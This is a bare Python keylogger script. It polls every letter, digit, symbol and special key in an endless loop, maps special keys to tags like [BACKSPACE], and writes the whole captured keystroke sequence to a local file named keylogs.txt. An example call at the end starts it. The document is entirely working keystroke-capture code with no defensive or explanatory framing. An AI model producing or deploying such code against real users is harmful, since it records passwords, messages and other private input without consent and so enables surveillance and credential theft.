import keyboard
import time
def keylog(filename):
    logged_keys = []  # Store pressed keys in order

    key_map = {
        "space": " ",
        "enter": "\n",
        "tab": "\t",
        "backspace": "[BACKSPACE]",
        "shift": "[SHIFT]",
        "ctrl": "[CTRL]",
        "alt": "[ALT]",
        "esc": "[ESC]",
        "caps lock": "[CAPSLOCK]",
        "delete": "[DEL]",
        "up": "[UP]",
        "down": "[DOWN]",
        "left": "[LEFT]",
        "right": "[RIGHT]"
    }

    monitored_keys = (
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789"
        "`~!@#$%^&*()-_=+[{]}\\|;:'\",<.>/?"
    )

    monitored_keys = list(monitored_keys) + list(key_map.keys())  # Combine all keys

    while True:
        for key in monitored_keys:
            if keyboard.is_pressed(key):
                logged_keys.append(key_map.get(key, key))  # Convert mapped keys or use raw key
                print(f"Key '{key}' logged")  # Debugging message
                time.sleep(0.15)

                with open(filename, "w") as file:  # Write the full sequence in order
                    file.write("".join(logged_keys))

# Example usage
keylog("keylogs.txt")
